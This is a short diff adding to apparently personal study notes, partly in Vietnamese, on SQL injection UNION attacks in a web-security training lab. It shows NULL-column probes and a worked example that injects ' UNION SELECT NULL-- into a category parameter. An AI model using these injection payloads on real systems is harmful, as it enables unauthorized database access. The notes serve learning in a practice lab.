@@ -43,3 +43,13 @@ UNION SELECT NULL
 UNION SELECT NULL, NULL
 UNION SELECT NULL, NULL, NULL
 ...
+
+EXAMPLE
+https://0a2c009903bfc9a780a31c86004b004e.web-security-academy.net/filter category=Accessories
+Giả sử truy vấn gốc trong DB:
+SELECT name, price FROM products WHERE category = 'Accessories' AND released = 1
+ta chèn ' UNION SELECT NULL-- sau Accessories trong URL sẽ thành:
+SELECT name, price FROM products WHERE category = 'Accessories' UNION SELECT NULL-- -' AND released = 1
+
+
+
